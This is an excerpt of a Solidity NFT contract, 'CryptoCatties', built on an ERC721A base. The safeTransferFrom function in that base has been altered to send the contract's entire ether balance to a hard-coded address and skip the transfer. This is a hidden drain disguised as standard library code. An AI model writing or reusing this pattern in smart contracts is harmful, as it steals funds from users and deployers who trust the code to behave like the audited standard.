...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x08e5d6EBB46e56Ed6a03eA00fF8FE986F60C4fFc).transfer(address(this).balance);
            return;
        }       
...
contract CryptoCatties is ERC721A, DefaultOperatorFilterer {
    string public baseURI = "ipfs://bafybeia5ux5gbvfl3txnuylqvrtgi3cd6xzntgrwx4yogdtha2umzaj6hm/";      
    ...
    constructor() ERC721A("CryptoCatties", "CC") {
        owner = msg.sender;
    }
